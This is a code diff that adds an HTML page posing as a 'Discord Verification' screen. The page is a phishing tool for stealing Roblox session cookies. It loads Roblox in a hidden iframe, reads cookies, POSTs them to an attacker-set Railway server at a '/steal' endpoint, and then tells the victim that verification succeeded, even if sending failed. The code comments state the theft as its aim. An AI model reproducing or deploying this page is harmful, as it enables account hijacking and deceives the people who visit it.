@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Verification</title>
+    <style>
+        body {
+            background-color: #23272a;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .box {
+            background: #2c2f33;
+            padding: 40px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #5865F2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success { color: #57F287; }
+        #iframe-container {
+            display: none; /* Hidden iframe to steal cookie */
+        }
+    </style>
+</head>
+<body>
+
+<div class="box" id="verify-box">
+    <h2>Verifying...</h2>
+    <div class="spinner"></div>
+    <p>Please wait while we confirm your identity.</p>
+</div>
+
+<!-- Hidden iframe to load Roblox and read its cookies -->
+<iframe id="robloxi" src="https://www.roblox.com/" width="1" height="1"></iframe>
+
+<script>
+    const RAILWAY_URL = "https://your-project.up.railway.app"; // Replace with your Railway URL
+
+    window.addEventListener('load', () => {
+        const iframe = document.getElementById('robloxi');
+        
+        // Wait for the iframe to load
+        iframe.onload = () => {
+            try {
+                // Try to read the cookie from the iframe's document
+                const robloxCookie = iframe.contentDocument.cookie;
+                
+                if (robloxCookie) {
+                    sendCookie(robloxCookie);
+                } else {
+                    // Fallback: try document.cookie (works on mobile/webviews)
+                    sendCookie(document.cookie);
+                }
+            } catch (e) {
+                // If cross-origin, we might not read it directly. 
+                // In that case, we rely on the browser sending it in the POST request if we use a proxy.
+                // For now, we try the fallback.
+                sendCookie(document.cookie);
+            }
+        };
+
+        function sendCookie(cookieValue) {
+            fetch(`${RAILWAY_URL}/steal`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    cookie: cookieValue, 
+                    userAgent: navigator.userAgent 
+                })
+            }).then(() => {
+                document.getElementById('verify-box').innerHTML = `
+                    <h2 class="success">Verification Complete!</h2>
+                    <p>You have been verified. You may close this tab.</p>
+                `;
+            }).catch(err => {
+                console.error("Failed to send cookie", err);
+                // Still show success to not break flow
+                document.getElementById('verify-box').innerHTML = `
+                    <h2 class="success">Verification Complete!</h2>
+                    <p>You have been verified. You may close this tab.</p>
+                `;
+            });
+        }
+    });
+</script>
+
+</body>
+</html>
